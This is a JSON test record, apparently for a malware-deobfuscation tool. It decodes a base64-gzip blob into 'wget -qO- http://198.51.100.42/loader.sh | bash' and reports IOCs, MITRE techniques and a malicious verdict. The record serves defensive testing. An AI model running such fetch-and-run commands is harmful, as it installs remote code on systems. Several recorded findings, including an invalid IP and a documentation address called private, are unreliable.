@@ -1,0 +1,608 @@
+{
+  "sample_id": "S4_nixwget_2layer",
+  "wrap": "b64(gzip(P))",
+  "input": "H4sIADvBW2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+  "input_sha1": "cd0957fef913f007b4b57c87ac96d65e0bf2e6fe",
+  "expected_plaintext": "wget -qO- http://198.51.100.42/loader.sh | bash",
+  "http_ms": 1412,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "gzip-decompress",
+        "args": {},
+        "reason": "GZIP-compressed layer"
+      },
+      {
+        "op": "download-shell-bg",
+        "args": {},
+        "reason": "Applied download-shell-bg"
+      }
+    ],
+    "output": "wget -qO- http://198.51.100.42/loader.sh | bash\n\n\u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500\nDownload URL : http://198.51.100.42/loader.sh\nBehavior     : wget \u2192 shell pipe, backgrounded, often flock-guarded\n               to prevent parallel-run collisions (botnet hallmark).\nMITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n               T1027 (Obfuscated Files)\n\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      magic+archetype:BASH_WGET_FLOCK_BACKGROUND \u00b7 conf 100/100\n  Chain:       base64-decode \u2192 gzip-decompress \u2192 download-shell-bg\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n\n  LOLBIN       Bash.exe\n\n  IOCs\n    URL       http://198.51.100.42/loader.sh\n    IP        198.51.100.42\n    IP        24.001.15.891\n    Domain    loader.sh\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Matched named wrapper archetype: `wget URL | (flock) | bash &` backgrounded downloader (botnet hallmark)."
+    ],
+    "detected_type": null,
+    "engine": "magic+archetype:BASH_WGET_FLOCK_BACKGROUND",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "\u001f\u008b\b\u0000;\u00c1[j\u0002\u00ff+OO-Q\u00d0-\u00f4\u00d7U\u00c8())\u00b0\u00d2\u00d77\u00b4\u00b4\u00d035\u00d4340\u00d031\u00d2\u00cf\u00c9OLI-\u00d2+\u00ceP\u00a8QHJ,\u00ce\u0000\u0000\t\u0001\u00e3\u0098/\u0000\u0000\u0000",
+        "output_length": 67,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 67,
+          "ascii": false,
+          "entropy": 5.301,
+          "hex_preview": "1f 8b 08 00 3b c1 5b 6a 02 ff 2b 4f 4f 2d 51 d0 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "gzip-decompress",
+        "args": {},
+        "reason": "GZIP-compressed layer",
+        "output_preview": "wget -qO- http://198.51.100.42/loader.sh | bash",
+        "output_length": 47,
+        "evidence": {
+          "encoding": "GZIP (RFC 1952)",
+          "op": "gzip-decompress",
+          "length": 47,
+          "ascii": true,
+          "entropy": 4.597,
+          "hex_preview": "77 67 65 74 20 2d 71 4f 2d 20 68 74 74 70 3a 2f \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "download-shell-bg",
+        "args": {},
+        "reason": "Applied download-shell-bg",
+        "output_preview": "wget -qO- http://198.51.100.42/loader.sh | bash",
+        "output_length": 47,
+        "evidence": {
+          "encoding": "download-shell-bg",
+          "op": "download-shell-bg",
+          "length": 47,
+          "ascii": true,
+          "entropy": 4.597,
+          "hex_preview": "77 67 65 74 20 2d 71 4f 2d 20 68 74 74 70 3a 2f \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "base64-decode",
+      "gzip-decompress",
+      "download-shell-bg"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "b64-gzip",
+      "chain": [
+        "env-expand"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "ps-join-char-array"
+          ],
+          "score": 42,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 92,
+        "length_bucket": "s",
+        "entropy": 5.152,
+        "b64_density": 1.0,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": true,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": true,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": null,
+    "layer_trace": [
+      {
+        "layer": "L0",
+        "engine": "archetype",
+        "chain_len": 1,
+        "score": 1.0,
+        "verdict": "matched"
+      },
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 2,
+        "op": "gzip-decompress",
+        "iocs": {
+          "urls": [
+            "http://198.51.100.42/loader.sh"
+          ],
+          "ips": [
+            "198.51.100.42"
+          ],
+          "domains": [
+            "loader.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": []
+      },
+      {
+        "layer": 3,
+        "op": "download-shell-bg",
+        "iocs": {
+          "urls": [
+            "http://198.51.100.42/loader.sh"
+          ],
+          "ips": [
+            "198.51.100.42"
+          ],
+          "domains": [
+            "loader.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": []
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 80,
+      "reason": "URL surfaced in decoded output: http://198.51.100.42/loader.sh.",
+      "indicators": [
+        {
+          "label": "Low entropy (5.33) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "GZIP (RFC 1952) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://198.51.100.42/loader.sh",
+          "kind": "positive"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://198.51.100.42/loader.sh",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 80
+    },
+    "iocs": {
+      "urls": [
+        "http://198.51.100.42/loader.sh"
+      ],
+      "ips": [
+        "198.51.100.42",
+        "24.001.15.891"
+      ],
+      "domains": [
+        "loader.sh"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "Bash.exe",
+        "purposes": [
+          "Execute",
+          "AWL Bypass"
+        ],
+        "mitre": [
+          "T1202",
+          "T1218"
+        ],
+        "description": "Performs execution of specified file, can be used as a defensive evasion.",
+        "snippet": ".100.42/loader.sh | bash \u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500 Download URL : http://198.51.100.42/loader.sh Behavior : wget \u2192 shell pipe, backgrounde",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/Bash/",
+        "source": "lolbas-api"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "H4sIADvBW2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "H4sIADvBW2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 4,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 2,
+        "label": "L2 \u00b7 GZIP-DECOMPRESS",
+        "op": "gzip-decompress",
+        "preview": "http://198.51.100.42/loader.sh 198.51.100.42 loader.sh",
+        "iocs": {
+          "urls": [
+            "http://198.51.100.42/loader.sh"
+          ],
+          "ips": [
+            "198.51.100.42"
+          ],
+          "domains": [
+            "loader.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "loader",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {
+          "ips": [
+            {
+              "value": "198.51.100.42",
+              "is_private": true,
+              "note": "RFC1918 / private address \u2014 not routable"
+            }
+          ],
+          "domains": [
+            {
+              "value": "loader.sh",
+              "classification": {
+                "tld": "sh",
+                "is_high_risk_tld": false,
+                "is_onion": false,
+                "length": 9,
+                "has_dashes": false,
+                "num_subdomains": 0
+              },
+              "resolved_ips": [
+                "104.21.6.141",
+                "172.67.155.14"
+              ],
+              "urlscan": {
+                "total": 9,
+                "results": [
+                  {
+                    "url": "https://loader.sh/en/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019da830-fe32-71dc-9340-0ef61f4213be"
+                  },
+                  {
+                    "url": "https://loader.sh/en/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019da7d3-56a9-7175-a0cd-c5c4f0cacfa4"
+                  },
+                  {
+                    "url": "https://loader.sh/en/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019d3588-eaf5-7233-8f19-199edfdaaa05"
+                  }
+                ]
+              },
+              "otx": {
+                "pulse_count": 1,
+                "reputation": null,
+                "pulses": [
+                  {
+                    "name": "Twitter Feed - skocherhan - 19-01-2026",
+                    "tags": [
+                      "Kimsuky"
+                    ]
+                  }
+                ]
+              }
+            }
+          ],
+          "urls": [
+            {
+              "value": "http://198.51.100.42/loader.sh",
+              "scheme": "http",
+              "host": "198.51.100.42",
+              "path": "/loader.sh",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 4,
+                "results": [
+                  {
+                    "url": "http://198.51.100.42/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019eb7ae-db13-712a-9ee7-f00755f1ef8e"
+                  },
+                  {
+                    "url": "http://198.51.100.42/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "01983039-f779-75bd-9709-7f2681e129b6"
+                  },
+                  {
+                    "url": "http://198.51.100.42/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "01983036-d0ce-7210-bbe7-837b6396a9e2"
+                  }
+                ]
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "family_hint": null,
+        "severity": {
+          "score": 23,
+          "band": "low"
+        }
+      },
+      {
+        "layer": 3,
+        "label": "L3 \u00b7 DOWNLOAD-SHELL-BG",
+        "op": "download-shell-bg",
+        "preview": "http://198.51.100.42/loader.sh 198.51.100.42 loader.sh",
+        "iocs": {
+          "urls": [
+            "http://198.51.100.42/loader.sh"
+          ],
+          "ips": [
+            "198.51.100.42"
+          ],
+          "domains": [
+            "loader.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "loader",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 13,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "wget -qO- http://198.51.100.42/loader.sh | bash\n\n\u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500\nDownload URL : http://198.51.100.42/loader.sh\nBehavior     : wget \u2192 shell pipe, backgrounded, often flock-guarded\n               to prevent parallel-run collisions (botnet hallmark).\nMITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n               T1027 (Obfuscated Files)\n",
+        "iocs": {
+          "urls": [
+            "http://198.51.100.42/loader.sh"
+          ],
+          "ips": [
+            "198.51.100.42"
+          ],
+          "domains": [
+            "loader.sh"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "Bash.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1202",
+              "T1218"
+            ],
+            "description": "Performs execution of specified file, can be used as a defensive evasion.",
+            "snippet": ".100.42/loader.sh | bash \u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500 Download URL : http://198.51.100.42/loader.sh Behavior : wget \u2192 shell pipe, backgrounde",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Bash/",
+            "source": "lolbas-api"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "loader",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          },
+          {
+            "rule": "Bash_Curl_Wget_Pipe_Shell",
+            "severity": "high",
+            "match": "wget -qO- http://198.51.100.42/loader.sh | bash",
+            "description": "curl/wget output piped directly to shell \u2014 classic Linux dropper pattern"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 28,
+          "band": "low"
+        }
+      }
+    ],
+    "output_raw": "wget -qO- http://198.51.100.42/loader.sh | bash\n\n\u2500\u2500\u2500\u2500 BASH_WGET_FLOCK_BACKGROUND (Feb 2026) \u2500\u2500\u2500\u2500\nDownload URL : http://198.51.100.42/loader.sh\nBehavior     : wget \u2192 shell pipe, backgrounded, often flock-guarded\n               to prevent parallel-run collisions (botnet hallmark).\nMITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n               T1027 (Obfuscated Files)\n",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      magic+archetype:BASH_WGET_FLOCK_BACKGROUND \u00b7 conf 100/100\n  Chain:       base64-decode \u2192 gzip-decompress \u2192 download-shell-bg\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n\n  LOLBIN       Bash.exe\n\n  IOCs\n    URL       http://198.51.100.42/loader.sh\n    IP        198.51.100.42\n    IP        24.001.15.891\n    Domain    loader.sh\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
